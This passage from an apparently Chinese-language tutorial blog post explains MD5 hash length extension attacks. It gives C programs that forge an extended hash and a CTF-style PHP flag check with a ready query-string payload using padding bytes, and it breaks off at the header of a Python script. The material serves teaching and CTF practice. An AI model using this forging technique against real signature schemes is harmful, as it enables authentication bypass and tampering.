+<li>通过将其粘贴在缓冲区中并执行<code>H(buffer)</code></li>
+<li>从第一个块的末尾开始，使用我们已经知道的状态<code>signature</code>，并<code>append</code>从该状态开始进行散列</li>
+</ul>
+<h3 id="对于一种也是在服务器端的计算过程" class="headerLink">
+    <a href="#%e5%af%b9%e4%ba%8e%e4%b8%80%e7%a7%8d%e4%b9%9f%e6%98%af%e5%9c%a8%e6%9c%8d%e5%8a%a1%e5%99%a8%e7%ab%af%e7%9a%84%e8%ae%a1%e7%ae%97%e8%bf%87%e7%a8%8b" class="header-mark"></a>对于一种（也是在服务器端的计算过程）</h3><p>其实就是按照正常的生成hash值的过程，最后生成出来的哈希值请我们这里暂定为：
+<code>6ee582a1669ce442f3719c47430dadee</code>
+这里贴出一下生成其md5的一个脚本</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">echo</span> <span class="err">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;openssl/md5.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="n">MD5_CTX</span> <span class="n">c</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="n">MD5_DIGEST_LENGTH</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="nf">MD5_Init</span><span class="p">(</span><span class="o">&amp;</span><span class="n">c</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">MD5_Update</span><span class="p">(</span><span class="o">&amp;</span><span class="n">c</span><span class="p">,</span> <span class="s">&#34;secret&#34;</span><span class="p">,</span> <span class="mi">6</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">MD5_Update</span><span class="p">(</span><span class="o">&amp;</span><span class="n">c</span><span class="p">,</span> <span class="s">&#34;data&#34;</span>
+</span></span><span class="line"><span class="cl">                 <span class="s">&#34;</span><span class="se">\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">                 <span class="s">&#34;</span><span class="se">\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">                 <span class="s">&#34;</span><span class="se">\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">                 <span class="s">&#34;</span><span class="se">\x00\x00\x00\x00</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">                 <span class="s">&#34;</span><span class="se">\x50\x00\x00\x00\x00\x00\x00\x00</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">                 <span class="s">&#34;append&#34;</span><span class="p">,</span> <span class="mi">64</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">MD5_Final</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">c</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">16</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%02x&#34;</span><span class="p">,</span> <span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="err">&#39;</span> <span class="o">&gt;</span> <span class="n">hash_extension_1</span><span class="p">.</span><span class="n">c</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">gcc</span> <span class="o">-</span><span class="n">o</span> <span class="n">hash_extension_1</span> <span class="n">hash_extension_1</span><span class="p">.</span><span class="n">c</span> <span class="o">-</span><span class="n">lssl</span> <span class="o">-</span><span class="n">lcrypto</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">.</span><span class="o">/</span><span class="n">hash_extension_1</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>可以看到这里的签名就是我们之前的数据。</p>
+<h3 id="第二种也就是攻击者" class="headerLink">
+    <a href="#%e7%ac%ac%e4%ba%8c%e7%a7%8d%e4%b9%9f%e5%b0%b1%e6%98%af%e6%94%bb%e5%87%bb%e8%80%85" class="header-mark"></a>第二种（也就是攻击者）</h3><p>这里我直接贴脚本出来</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;openssl/md5.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="n">MD5_DIGEST_LENGTH</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">  <span class="n">MD5_CTX</span> <span class="n">c</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="nf">MD5_Init</span><span class="p">(</span><span class="o">&amp;</span><span class="n">c</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">MD5_Update</span><span class="p">(</span><span class="o">&amp;</span><span class="n">c</span><span class="p">,</span> <span class="s">&#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#34;</span><span class="p">,</span> <span class="mi">64</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">c</span><span class="p">.</span><span class="n">A</span> <span class="o">=</span> <span class="nf">htonl</span><span class="p">(</span><span class="mh">0x6036708e</span><span class="p">);</span> <span class="cm">/* &lt;-- This is the hash we already had */</span>
+</span></span><span class="line"><span class="cl">  <span class="n">c</span><span class="p">.</span><span class="n">B</span> <span class="o">=</span> <span class="nf">htonl</span><span class="p">(</span><span class="mh">0xba0d11f6</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">c</span><span class="p">.</span><span class="n">C</span> <span class="o">=</span> <span class="nf">htonl</span><span class="p">(</span><span class="mh">0xef52ad44</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">c</span><span class="p">.</span><span class="n">D</span> <span class="o">=</span> <span class="nf">htonl</span><span class="p">(</span><span class="mh">0xe8b74d5b</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="nf">MD5_Update</span><span class="p">(</span><span class="o">&amp;</span><span class="n">c</span><span class="p">,</span> <span class="s">&#34;append&#34;</span><span class="p">,</span> <span class="mi">6</span><span class="p">);</span> <span class="cm">/* This is the appended data. */</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">MD5_Final</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">c</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">16</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%02x&#34;</span><span class="p">,</span> <span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="err">&#39;</span> <span class="o">&gt;</span> <span class="n">hash_extension_2</span><span class="p">.</span><span class="n">c</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">gcc</span> <span class="o">-</span><span class="n">o</span> <span class="n">hash_extension_2</span> <span class="n">hash_extension_2</span><span class="p">.</span><span class="n">c</span> <span class="o">-</span><span class="n">lssl</span> <span class="o">-</span><span class="n">lcrypto</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">.</span><span class="o">/</span><span class="n">hash_extension_2</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>可以看见我们这里对四个幻数（前面的理论有讲到），作为了一个初始参数
+let <code>signature = hash(secret || data) = 6036708eba0d11f6ef52ad44e8b74d5b</code>
+来进行md5值的加密，其实就是利用了AAAA那群数据块对其进行了再次的<strong>多轮压缩环节</strong>。
+最后生成出来的哈希值
+<code>6ee582a1669ce442f3719c47430dadee</code></p>
+<p>其实到此为止，这个攻击就完成了。但是这里要说一下，放在理论上是比较难理解的，这里还是需要举例子可以更加直观的理解（其实在题目中的本质就是将最后面的多轮压缩再对你可控的append进行一次压缩从而你可以知道后面生成的MD5值是什么）</p>
+<h2 id="demo1" class="headerLink">
+    <a href="#demo1" class="header-mark"></a>DEMO1</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$flag</span><span class="o">=</span><span class="nx">getenv</span><span class="p">(</span><span class="s2">&#34;DASFLAG&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;md5&#34;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;i&#34;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;s&#34;</span><span class="p">])){</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$fl4g</span> <span class="o">=</span> <span class="nx">substr_replace</span><span class="p">(</span><span class="nv">$flag</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;s&#34;</span><span class="p">],</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;i&#34;</span><span class="p">],</span> <span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;md5&#34;</span><span class="p">]</span> <span class="o">===</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$fl4g</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;please try again&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$flag</span><span class="o">.</span><span class="s2">&#34;yusa&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="mi">1</span><span class="nx">c3de59d2f68788cc792e0eb7d604710</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里直接放出playload：
+<code>?md5=d9671633e3723203bc2a1479c8412307&amp;i=-1&amp;s=}yusa%80%00%00%00%00%00%00%00%00%00%00%00%00%00%50%01%00%00%00%00%00%00a</code>
+这里我利用前面的的讲的ATTACK来进行讲解:</p>
+<p>例如我们的flag值是<code>DT{axsak1dlsajl1}</code>
+那么此时的16进制就是这样的
+<figure><img
+        
+        loading="lazy"
+        src="/img/%e6%b7%b1%e5%85%a5%e6%b5%85%e5%87%ba-Hash%e9%95%bf%e5%ba%a6%e6%8b%93%e5%b1%95%e6%94%bb%e5%87%bb/4.png"
+        srcset="/img/%e6%b7%b1%e5%85%a5%e6%b5%85%e5%87%ba-Hash%e9%95%bf%e5%ba%a6%e6%8b%93%e5%b1%95%e6%94%bb%e5%87%bb/4.png, /img/%e6%b7%b1%e5%85%a5%e6%b5%85%e5%87%ba-Hash%e9%95%bf%e5%ba%a6%e6%8b%93%e5%b1%95%e6%94%bb%e5%87%bb/4.png 1.5x, /img/%e6%b7%b1%e5%85%a5%e6%b5%85%e5%87%ba-Hash%e9%95%bf%e5%ba%a6%e6%8b%93%e5%b1%95%e6%94%bb%e5%87%bb/4.png 2x"
+        alt="/img/深入浅出-Hash长度拓展攻击/4.png"
+        title="/img/深入浅出-Hash长度拓展攻击/4.png" ></figure>
+然后在加了salt之后就是加入<code>yusa</code>后就是
+<figure><img
+        
+        loading="lazy"
+        src="/img/%e6%b7%b1%e5%85%a5%e6%b5%85%e5%87%ba-Hash%e9%95%bf%e5%ba%a6%e6%8b%93%e5%b1%95%e6%94%bb%e5%87%bb/5.png"
+        srcset="/img/%e6%b7%b1%e5%85%a5%e6%b5%85%e5%87%ba-Hash%e9%95%bf%e5%ba%a6%e6%8b%93%e5%b1%95%e6%94%bb%e5%87%bb/5.png, /img/%e6%b7%b1%e5%85%a5%e6%b5%85%e5%87%ba-Hash%e9%95%bf%e5%ba%a6%e6%8b%93%e5%b1%95%e6%94%bb%e5%87%bb/5.png 1.5x, /img/%e6%b7%b1%e5%85%a5%e6%b5%85%e5%87%ba-Hash%e9%95%bf%e5%ba%a6%e6%8b%93%e5%b1%95%e6%94%bb%e5%87%bb/5.png 2x"
+        alt="/img/深入浅出-Hash长度拓展攻击/5.png"
+        title="/img/深入浅出-Hash长度拓展攻击/5.png" ></figure>
+此时的原始数据长度就是21*8=168bit，转化为16进制就是a8
+填充后就是这样
+<figure><img
+        
+        loading="lazy"
+        src="/img/%e6%b7%b1%e5%85%a5%e6%b5%85%e5%87%ba-Hash%e9%95%bf%e5%ba%a6%e6%8b%93%e5%b1%95%e6%94%bb%e5%87%bb/6.png"
+        srcset="/img/%e6%b7%b1%e5%85%a5%e6%b5%85%e5%87%ba-Hash%e9%95%bf%e5%ba%a6%e6%8b%93%e5%b1%95%e6%94%bb%e5%87%bb/6.png, /img/%e6%b7%b1%e5%85%a5%e6%b5%85%e5%87%ba-Hash%e9%95%bf%e5%ba%a6%e6%8b%93%e5%b1%95%e6%94%bb%e5%87%bb/6.png 1.5x, /img/%e6%b7%b1%e5%85%a5%e6%b5%85%e5%87%ba-Hash%e9%95%bf%e5%ba%a6%e6%8b%93%e5%b1%95%e6%94%bb%e5%87%bb/6.png 2x"
+        alt="/img/深入浅出-Hash长度拓展攻击/6.png"
+        title="/img/深入浅出-Hash长度拓展攻击/6.png" ></figure>
+那么进行多轮压缩的时候就是将其作为一个数据块进行压缩。
+这里我直接贴出来md5值为：
+<code>2b604a43f439b6e02c09dece6a83e503</code>
+这个是我们已知的，后面用[YZ]表示</p>
+<h4 id="构造" class="headerLink">
+    <a href="#%e6%9e%84%e9%80%a0" class="header-mark"></a>构造</h4><p>这个时候我们就可以构造一下我们的playload什么的了
+我们看到题目
+<code>$fl4g = substr_replace($flag, $_GET[&quot;s&quot;], $_GET[&quot;i&quot;], 1);</code>
+是对原本的flag进行了替换，那么此时我们可以想想，因为这个题目只能替换掉一个长度，那么对于定义，在前面的数据块中我们已经知道了其md5值，那么我们可以替换后添加到下一个数据块让他再次进行压缩，这个时候我们就知道他的下一个构造出来的md5是什么了
+过程：
+<figure><img
+        
+        loading="lazy"
+        src="/img/%e6%b7%b1%e5%85%a5%e6%b5%85%e5%87%ba-Hash%e9%95%bf%e5%ba%a6%e6%8b%93%e5%b1%95%e6%94%bb%e5%87%bb/7.png"
+        srcset="/img/%e6%b7%b1%e5%85%a5%e6%b5%85%e5%87%ba-Hash%e9%95%bf%e5%ba%a6%e6%8b%93%e5%b1%95%e6%94%bb%e5%87%bb/7.png, /img/%e6%b7%b1%e5%85%a5%e6%b5%85%e5%87%ba-Hash%e9%95%bf%e5%ba%a6%e6%8b%93%e5%b1%95%e6%94%bb%e5%87%bb/7.png 1.5x, /img/%e6%b7%b1%e5%85%a5%e6%b5%85%e5%87%ba-Hash%e9%95%bf%e5%ba%a6%e6%8b%93%e5%b1%95%e6%94%bb%e5%87%bb/7.png 2x"
+        alt="/img/深入浅出-Hash长度拓展攻击/7.png"
+        title="/img/深入浅出-Hash长度拓展攻击/7.png" ></figure>
+这个是完整的一个数据块，那么此时我们如果替换完后把他变为
+<figure><img
+        
+        loading="lazy"
+        src="/img/%e6%b7%b1%e5%85%a5%e6%b5%85%e5%87%ba-Hash%e9%95%bf%e5%ba%a6%e6%8b%93%e5%b1%95%e6%94%bb%e5%87%bb/8.png"
+        srcset="/img/%e6%b7%b1%e5%85%a5%e6%b5%85%e5%87%ba-Hash%e9%95%bf%e5%ba%a6%e6%8b%93%e5%b1%95%e6%94%bb%e5%87%bb/8.png, /img/%e6%b7%b1%e5%85%a5%e6%b5%85%e5%87%ba-Hash%e9%95%bf%e5%ba%a6%e6%8b%93%e5%b1%95%e6%94%bb%e5%87%bb/8.png 1.5x, /img/%e6%b7%b1%e5%85%a5%e6%b5%85%e5%87%ba-Hash%e9%95%bf%e5%ba%a6%e6%8b%93%e5%b1%95%e6%94%bb%e5%87%bb/8.png 2x"
+        alt="/img/深入浅出-Hash长度拓展攻击/8.png"
+        title="/img/深入浅出-Hash长度拓展攻击/8.png" ></figure>
+这样之后那么是不是在服务端就会再次对其进行填充和多轮压缩，也就是这样
+<figure><img
+        
+        loading="lazy"
+        src="/img/%e6%b7%b1%e5%85%a5%e6%b5%85%e5%87%ba-Hash%e9%95%bf%e5%ba%a6%e6%8b%93%e5%b1%95%e6%94%bb%e5%87%bb/9.png"
+        srcset="/img/%e6%b7%b1%e5%85%a5%e6%b5%85%e5%87%ba-Hash%e9%95%bf%e5%ba%a6%e6%8b%93%e5%b1%95%e6%94%bb%e5%87%bb/9.png, /img/%e6%b7%b1%e5%85%a5%e6%b5%85%e5%87%ba-Hash%e9%95%bf%e5%ba%a6%e6%8b%93%e5%b1%95%e6%94%bb%e5%87%bb/9.png 1.5x, /img/%e6%b7%b1%e5%85%a5%e6%b5%85%e5%87%ba-Hash%e9%95%bf%e5%ba%a6%e6%8b%93%e5%b1%95%e6%94%bb%e5%87%bb/9.png 2x"
+        alt="/img/深入浅出-Hash长度拓展攻击/9.png"
+        title="/img/深入浅出-Hash长度拓展攻击/9.png" ></figure>
+（这里的A7是我随便写的，因为懒得算前面的长度再转换了）
+这里此时是不是第二个分块压缩就会利用包含a在的数据块再次对数据进行压缩，此时生成出来的md5值就和我们需要的md5值便一样了，
+这里随便举一个例子：我们生成的md5是<code>d9671633e3723203bc2a1479c8412307</code>
+那么显而易见，在服务端生成的md5值也就一定是这个也就绕过了
+<code>$_GET[&quot;md5&quot;] === md5($fl4g)</code>的限制了</p>
+<h2 id="demo1小总结" class="headerLink">
+    <a href="#demo1%e5%b0%8f%e6%80%bb%e7%bb%93" class="header-mark"></a>demo1小总结</h2><p>总的来说，我们可以很容易的看出来，其实就是我们可以构造出和原本数据一样的数据块之后自己补到下一个数据块内容来进行获得md5的加密值,也就是将我们的YZ放到上面ATTACK-&gt;第二种下面的脚本来进行获得md5值的过程</p>
+<p>这个demo1后面再放出一个py脚本</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span><span class="lnt">121
+</span><span class="lnt">122
+</span><span class="lnt">123
+</span><span class="lnt">124
+</span><span class="lnt">125
+</span><span class="lnt">126
+</span><span class="lnt">127
+</span><span class="lnt">128
+</span><span class="lnt">129
+</span><span class="lnt">130
+</span><span class="lnt">131
+</span><span class="lnt">132
+</span><span class="lnt">133
+</span><span class="lnt">134
+</span><span class="lnt">135
+</span><span class="lnt">136
+</span><span class="lnt">137
+</span><span class="lnt">138
+</span><span class="lnt">139
+</span><span class="lnt">140
+</span><span class="lnt">141
+</span><span class="lnt">142
+</span><span class="lnt">143
+</span><span class="lnt">144
+</span><span class="lnt">145
+</span><span class="lnt">146
+</span><span class="lnt">147
+</span><span class="lnt">148
+</span><span class="lnt">149
+</span><span class="lnt">150
+</span><span class="lnt">151
+</span><span class="lnt">152
+</span><span class="lnt">153
+</span><span class="lnt">154
+</span><span class="lnt">155
+</span><span class="lnt">156
+</span><span class="lnt">157
+</span><span class="lnt">158
+</span><span class="lnt">159
+</span><span class="lnt">160
+</span><span class="lnt">161
+</span><span class="lnt">162
+</span><span class="lnt">163
+</span><span class="lnt">164
+</span><span class="lnt">165
+</span><span class="lnt">166
+</span><span class="lnt">167
+</span><span class="lnt">168
+</span><span class="lnt">169
+</span><span class="lnt">170
+</span><span class="lnt">171
+</span><span class="lnt">172
+</span><span class="lnt">173
+</span><span class="lnt">174
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># -*- coding: utf-8 -*-</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># @Author: King kaki</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># @Date:   2018-08-04 12:40:11</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># @Last Modified by:   kingkk</span>
